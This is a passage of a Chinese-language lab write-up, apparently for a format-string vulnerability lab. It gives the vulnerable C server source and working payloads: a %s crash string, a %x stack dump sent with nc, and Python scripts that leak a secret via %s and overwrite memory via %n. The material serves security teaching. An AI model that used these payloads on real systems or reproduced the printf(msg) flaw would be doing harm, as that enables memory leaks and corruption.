0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the ebp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%ebp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// This line has a format-string vulnerability</span><br>    <span class="hljs-built_in">printf</span>(msg);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1500</span>];<br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.16lx\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) &amp;target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  &amp;target);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Waiting for user input ......\n&quot;</span>); <br>    <span class="hljs-keyword">int</span> length = fread(buf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1500</span>, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Received %d bytes.\n&quot;</span>, length);<br><br>    dummy_function(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(^_^)(^_^)  Returned properly (^_^)(^_^)\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// This function is used to insert a stack frame between main and myprintf.</span><br><span class="hljs-comment">// The size of the frame can be adjusted at the compilation time. </span><br><span class="hljs-comment">// The function itself does not do anything.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> dummy_buffer[BUF_SIZE];<br>    <span class="hljs-built_in">memset</span>(dummy_buffer, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    myprintf(str);<br>&#125;<br></code></pre></td></tr></table></figure><p>32位简略版本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>  target = <span class="hljs-number">0x11223344</span>;<br><br><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">&quot;A secret message\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the ebp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%ebp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>) framep);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);<br>    <span class="hljs-built_in">printf</span>(msg);<span class="hljs-comment">// This line has a format-string vulnerability</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1500</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The input buffer&#x27;s address:    0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret message&#x27;s address:  0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  secret);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The target variable&#x27;s address: 0x%.8x\n&quot;</span>,   (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)  &amp;target);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Waiting for user input ......\n&quot;</span>); <br>    <span class="hljs-keyword">int</span> length = fread(buf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1500</span>, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Received %d bytes.\n&quot;</span>, length);<br><br>    dummy_function(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(^_^)(^_^)  Returned properly (^_^)(^_^)\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> dummy_buffer[BUF_SIZE];<br>    <span class="hljs-built_in">memset</span>(dummy_buffer, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    myprintf(str);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h1><p>向服务器提供一个输入，这样当服务器程序试图打印 myprintf ()函数中的用户输入时，它就会崩溃</p><p>这是正常的输出：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Got a connection from <span class="hljs-number">10.9.0.1</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Starting format<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The input buffer&#x27;s address:    <span class="hljs-number">0</span>xffffd<span class="hljs-number">300</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The secret message&#x27;s address:  <span class="hljs-number">0</span>x<span class="hljs-number">080</span>b<span class="hljs-number">4008</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s address: <span class="hljs-number">0</span>x<span class="hljs-number">080</span>e<span class="hljs-number">5068</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Waiting for user input ......<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Received <span class="hljs-number">6</span> bytes.<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | Frame Pointer (inside myprintf):      <span class="hljs-number">0</span>xffffd<span class="hljs-number">228</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s value (before): <span class="hljs-number">0</span>x<span class="hljs-number">11223344</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | hello<br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | The target variable&#x27;s value (after):  <span class="hljs-number">0</span>x<span class="hljs-number">11223344</span><br><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | (^_^)(^_^)  Returned properly (^_^)(^_^)<br></code></pre></td></tr></table></figure><p>为了使程序崩溃，只需要输入<code>%s%s%s%s%s%s%s%s%s</code>即可，总会有指针访问到不可访问的内存</p><p>crash成功的标志是不显示 <code>(_)(_)  Returned properly (_)(_)</code></p><h1 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h1><h2 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h2><p>打印出堆栈上的数据。需要多少% x 格式说明符才能让服务器程序打印输入的前四个字节</p><blockquote><p>Difference between %p and %x in C/C++</p><p>The %p is used to print the pointer value, and %x is <strong>used to print hexadecimal values</strong>. Though pointers can also be displayed using %u, or %x.</p></blockquote><p>输入</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">$ echo AAAA_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span>_<span class="hljs-built_in">%x</span> | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure><p>回显</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | AAAA_<span class="hljs-number">11223344</span>_<span class="hljs-number">1000</span>_<span class="hljs-number">8049</span>db<span class="hljs-number">5</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">80</span>e<span class="hljs-number">61</span>c<span class="hljs-number">0</span>_ffffd<span class="hljs-number">300</span>_ffffd<span class="hljs-number">228</span>_<span class="hljs-number">80</span>e<span class="hljs-number">62</span>d<span class="hljs-number">4</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_ffffd<span class="hljs-number">2</span>c<span class="hljs-number">8</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">7</span>e_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">0</span>_<span class="hljs-number">64</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">47</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">4</span>ff_ffffd<span class="hljs-number">3</span>dd_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">80</span>e<span class="hljs-number">9720</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_e<span class="hljs-number">2</span>fa<span class="hljs-number">4</span>d<span class="hljs-number">00</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_<span class="hljs-number">80</span>e<span class="hljs-number">5000</span>_ffffd<span class="hljs-number">8</span>e<span class="hljs-number">8</span>_<span class="hljs-number">8049</span>eff_ffffd<span class="hljs-number">300</span>_dd_<span class="hljs-number">5</span>dc_<span class="hljs-number">80</span>e<span class="hljs-number">5320</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_ffffd<span class="hljs-number">9</span>b<span class="hljs-number">4</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_dd_<span class="hljs-number">41414141</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span>_<span class="hljs-number">78255</span>f<span class="hljs-number">78</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span>_<span class="hljs-number">78255</span>f<span class="hljs-number">78</span>_<span class="hljs-number">5</span>f<span class="hljs-number">78255</span>f_<span class="hljs-number">255</span>f<span class="hljs-number">7825</span><br></code></pre></td></tr></table></figure><p>可以看到41414141，这个就是我们写的AAAA</p><p>把放到1.txt里面，输入命令<code>grep -o &#39;_&#39; 1.txt | wc - l</code></p><p>1.txt：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">AAAA_<span class="hljs-number">11223344</span>_<span class="hljs-number">1000</span>_<span class="hljs-number">8049</span>db<span class="hljs-number">5</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">80e61</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>_ffffd<span class="hljs-number">300</span>_ffffd<span class="hljs-number">228</span>_<span class="hljs-number">80e62</span>d<span class="hljs-number">4</span>_<span class="hljs-number">80e5000</span>_ffffd<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">7</span>e_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">0</span>_<span class="hljs-number">64</span>_<span class="hljs-number">8049</span>f<span class="hljs-number">47</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">4</span>ff_ffffd<span class="hljs-number">3</span>dd_ffffd<span class="hljs-number">300</span>_<span class="hljs-number">80e5320</span>_<span class="hljs-number">80e9720</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_e<span class="hljs-number">2</span>fa<span class="hljs-number">4</span>d<span class="hljs-number">00</span>_<span class="hljs-number">80e5000</span>_<span class="hljs-number">80e5000</span>_ffffd<span class="hljs-number">8e8</span>_<span class="hljs-number">8049</span>eff_ffffd<span class="hljs-number">300</span>_dd_<span class="hljs-number">5</span>dc_<span class="hljs-number">80e5320</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_ffffd<span class="hljs-number">9</span>b<span class="hljs-number">4</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_<span class="hljs-number">0</span>_dd_<span class="hljs-number">41414141</span><br></code></pre></td></tr></table></figure><p>64个%x</p><h2 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h2><p>已知秘密信息地址为0x080b4008</p><p>我们输入的字符串最开始应该是秘密信息的地址，然后用63个%x让指针移动，64就是秘密信息的位置，使用%s打印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N)) <span class="hljs-comment">#填充0</span><br>secret  = <span class="hljs-number">0x080b4008</span> <span class="hljs-comment">#秘密信息的地址</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<span class="hljs-comment">#将最开始的内容改为秘密信息的地址</span><br>data = <span class="hljs-string">&quot;%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;\nmessage:%s&quot;</span><span class="hljs-comment">#偏移</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><p>回显</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">server-<span class="hljs-number">10.9.0.5</span> |@<br>                 <span class="hljs-number">1122334410008049d</span>b580e532080e61c0ffffd300ffffd22880e62d480e5000ffffd2c88049f7effffd3000648049f4780e53205dc5dcffffd300ffffd30080e97200000000000000000000000000151470080e500080e5000ffffd8e88049effffffd3005dc5dc80e5320000ffffd9b40005dc<br>server-<span class="hljs-number">10.9.0.5</span> | message:<span class="hljs-keyword">A</span> secret message<br></code></pre></td></tr></table></figure><h1 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h1><p>修改服务器程序中定义的目标变量的值(继续使用10.9.0.5)。Target 的原始值是0x11223344</p><h2 id="Task-3-A"><a href="#Task-3-A" class="headerlink" title="Task 3.A:"></a>Task 3.A:</h2><p>Change the value to a different value. In this sub-task, we need to change the content of<br>the target variable to something else. Your task is considered as a success if you can change it to a<br>different value, regardless of what value it may be. The address of the target variable can be found<br>from the server printout</p><p>改为任意值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>secret  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>data = <span class="hljs-string">&quot;%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;\ntarget changed:%n&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>-<span class="hljs-number">10.9.0.5</span> | target changed:The target variable&#x27;s value (after):  <span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fc<br></code></pre></td></tr></table></figure><h2 id="Task-3-B"><a href="#Task-3-B" class="headerlink" title="Task 3.B"></a>Task 3.B</h2><p> Change the value to 0x5000. In this sub-task, we need to change the content of the<br>target variable to a specific value 0x5000. Your task is considered as a success only if the vari-<br>able’s value becomes 0x5000.</p><p>将值更改为0x5000</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>secret  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (secret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.19980x&quot;</span> + <span class="hljs-string">&quot;%n&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(data)] = data<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  